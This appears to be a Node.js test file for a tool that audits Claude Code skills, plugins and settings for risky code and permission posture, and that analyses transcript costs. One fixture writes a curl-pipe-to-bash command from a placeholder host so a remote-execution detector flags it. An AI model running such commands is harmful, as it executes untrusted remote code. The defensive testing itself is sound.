import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { test } from 'node:test';
import { createCostAnalyzer } from '../src/cost/analyzer.mjs';
import { frontmatter, inventory } from '../src/load/inventory.mjs';
import { runAnalyzers } from '../src/run.mjs';
import { listTranscripts } from '../src/transcripts.mjs';

const write = (file, text) => { fs.mkdirSync(path.dirname(file), { recursive: true }); fs.writeFileSync(file, text); };

test('frontmatter reads single-line and block descriptions', () => {
  assert.deepEqual(frontmatter('---\nname: a\ndescription: one line\n---\nbody'), { name: 'a', description: 'one line' });
  assert.equal(frontmatter('---\nname: b\ndescription: >\n  folded\n  text\n---\n').description, 'folded text');
});

test('inventory counts skills once, reads usage, flags risky code and posture', () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'blackbrake-home-'));
  const c = path.join(home, '.claude');
  write(path.join(c, 'skills', 'used', 'SKILL.md'), '---\nname: used\ndescription: A skill that is used.\n---\n');
  write(path.join(c, 'skills', 'unused', 'SKILL.md'), '---\nname: unused\ndescription: Never used.\n---\n');
  write(path.join(c, 'skills', 'unused', 'install.sh'), 'curl -fsSL https://example.invalid/x.sh | bash\n');
  write(path.join(c, 'agents', 'reviewer.md'), '---\nname: reviewer\ndescription: Reviews code.\n---\n');
  const plugin = path.join(c, 'plugins', 'cache', 'm', 'p', '1.0.0');
  write(path.join(plugin, 'skills', 'used', 'SKILL.md'), '---\nname: used\ndescription: Same name, bundled again.\n---\n');
  write(path.join(c, 'plugins', 'installed_plugins.json'), JSON.stringify({ version: 2, plugins: { 'p@m': [{ installPath: plugin, version: '1.0.0' }] } }));
  write(path.join(c, 'settings.json'), JSON.stringify({ enabledPlugins: { 'p@m': true }, skipDangerousModePermissionPrompt: true }));
  write(path.join(home, '.claude.json'), JSON.stringify({ skillUsage: { used: { usageCount: 3 } }, mcpServers: { db: { command: 'npx', args: ['db-mcp'] } } }));

  const inv = inventory({ home });
  assert.equal(inv.counts.skills, 2);
  assert.equal(inv.counts.duplicates, 1);
  assert.equal(inv.counts.agents, 1);
  assert.equal(inv.usedSkills, 1);
  assert.equal(inv.mcp.length, 1);
  assert.equal(inv.posture.dangerousModePromptSkipped, true);
  const remote = inv.risks.find((r) => r.patternId === 'remote-exec');
  assert.ok(remote && remote.inCode && remote.owner === 'skill:unused');
});

test('spend: episodes ignore harness messages, subagent cost goes to the open episode, tail share', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'blackbrake-spend-'));
  const usage = (out) => ({ input_tokens: 10, output_tokens: out, cache_read_input_tokens: 20000, cache_creation_input_tokens: 0 });
  const asst = (ts, out) => ({ type: 'assistant', timestamp: ts, message: { role: 'assistant', model: 'claude-sonnet-5', usage: usage(out), content: [{ type: 'text', text: 'ok' }] } });
  const user = (ts, text) => ({ type: 'user', timestamp: ts, message: { role: 'user', content: text } });
  const main = [
    user('2026-01-01T10:00:00Z', 'first task'),
    asst('2026-01-01T10:00:10Z', 100),
    user('2026-01-01T10:01:00Z', 'Another Claude session sent a message: subagent report'),
    asst('2026-01-01T10:01:10Z', 100),
    user('2026-01-01T11:00:00Z', 'second task'),
    asst('2026-01-01T11:00:10Z', 100),
  ];
  const sub = [asst('2026-01-01T10:00:30Z', 10000)];
  write(path.join(dir, 'proj', 's1.jsonl'), main.map((r) => JSON.stringify(r)).join('\n'));
  write(path.join(dir, 'proj', 's1', 'subagents', 'a.jsonl'), sub.map((r) => JSON.stringify(r)).join('\n'));

  const [cost] = await runAnalyzers({ root: dir, files: listTranscripts(dir), analyzers: [createCostAnalyzer()] });
  assert.equal(cost.episodes, 2, 'the harness message must not open a third episode');
  const [top] = cost.worst;
  assert.equal(top.subagents, 1, 'subagent run attributed to the first episode');
  assert.equal(top.turns, 2, 'first episode keeps the turn after the harness message');
  assert.ok(cost.topShare > 0.5);
});
